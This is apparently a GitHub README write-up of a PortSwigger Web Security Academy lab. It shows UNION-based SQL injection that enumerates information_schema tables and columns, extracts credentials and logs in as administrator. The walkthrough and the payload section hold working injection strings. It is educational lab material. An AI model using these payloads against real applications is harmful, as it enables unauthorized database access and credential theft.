<div align="center">

![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Status](https://img.shields.io/badge/status-solved-brightgreen?style=flat-square)
![Year](https://img.shields.io/badge/year-2026-orange?style=flat-square)
![Platform](https://img.shields.io/badge/platform-PortSwigger%20Web%20Academy-orange?style=flat-square&logo=burpsuite&logoColor=white)
![Type](https://img.shields.io/badge/type-SQL%20Injection-red?style=flat-square)
![Technique](https://img.shields.io/badge/technique-UNION%20Attack-darkred?style=flat-square)

<h1>SQLi Lab 05 — Listing DB Contents (Non-Oracle)</h1>
<p><em>UNION-based SQL injection to enumerate tables, columns, and credentials from information_schema.</em></p>

[Writeup](#walkthrough) · [Payloads](#payloads) · [Key Takeaways](#key-takeaways)

</div>

---

## Table of Contents

- [Overview](#overview)
- [Why This Lab](#why-this-lab)
- [Lab Details](#lab-details)
- [Walkthrough](#walkthrough)
- [Payloads](#payloads)
- [Key Takeaways](#key-takeaways)
- [References](#references)
- [Author](#author)

---

## Overview

This lab demonstrates a UNION-based SQL injection vulnerability in a product category filter on a simulated e-commerce application. The goal is to enumerate non-Oracle database contents using `information_schema` views — list all tables, identify the users table, extract column names, retrieve credentials, and log in as the `administrator` user.

---

## Why This Lab

`information_schema` is the universal metadata registry for MySQL, PostgreSQL, MSSQL, and SQLite. Understanding how to query it through a UNION injection is a foundational skill for any web penetration tester — it's the standard enumeration path before tools like `sqlmap` automate it. This lab builds manual fluency with the full chain: column count → table names → column names → data extraction.

---

## Lab Details

| Field               | Value                                   |
| ------------------- | --------------------------------------- |
| Platform            | PortSwigger Web Security Academy        |
| Lab Number          | 05                                      |
| Category            | SQL Injection                           |
| Technique           | UNION Attack                            |
| Target DBMS         | Non-Oracle (PostgreSQL / MySQL / MSSQL) |
| Objective           | Log in as `administrator`               |
| Vulnerability Point | `category` parameter in product filter  |

---

## Walkthrough

### Step 1 — Confirm UNION Compatibility

Determine number of columns returned by the original query and which columns reflect string data.

```
/filter?category=Accessories' ORDER BY 2--
```

Two columns confirmed. Both accept strings.

---

### Step 2 — List All Tables via information_schema

Query `information_schema.tables` to dump all user-defined table names.

```
/filter?category=Accessories' UNION SELECT table_name,NULL FROM information_schema.tables--
```

<img src="evidence/Listing Tables.png" width="750" alt="Listing Tables via information_schema">

Identify the users table from the output — e.g., `users_cbcldv`.

---

### Step 3 — Enumerate Columns of the Target Table

```
/filter?category=Accessories' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--
```

<img src="evidence/Listing password columns.png" width="750" alt="Listing password columns from users table">

Identify username and password column names from the response.

---

### Step 4 — Extract Credentials

```
/filter?category=Accessories' UNION SELECT username_col,password_col FROM users_cbcldv--
```

<img src="evidence/admin password.png" width="750" alt="Admin password extracted via UNION injection">

Replace `username_col` and `password_col` with the actual names found in Step 3.

---

### Step 5 — Login

Navigate to `/login` and authenticate as `administrator` using the extracted password.

<img src="evidence/lab-solved.png" width="750" alt="Lab solved — logged in as administrator">

---

## Payloads

```sql
-- List all tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- List columns for a specific table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--

-- Extract credentials
' UNION SELECT username_col,password_col FROM users_cbcldv--
```

---

## Key Takeaways

- `information_schema.tables` and `information_schema.columns` are accessible on all non-Oracle databases by default
- UNION attacks require matching column count and compatible data types
- Table and column names are randomized in this lab — always enumerate first, never guess
- Oracle uses `ALL_TABLES` and `ALL_TAB_COLUMNS` instead of `information_schema`

---

## References

- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQL Injection — UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [information_schema — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

---

## Author

**Michael Asante Anim** · `0x1aerixis`

[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/anim-michael-asante)
[![X](https://img.shields.io/badge/X-0x1aerixis-000000?style=flat-square&logo=x&logoColor=white)](https://x.com/0x1aerixis)

---

<div align="center">
  <sub>Built for learning. Tested on PortSwigger Web Security Academy · 2026</sub>
</div>
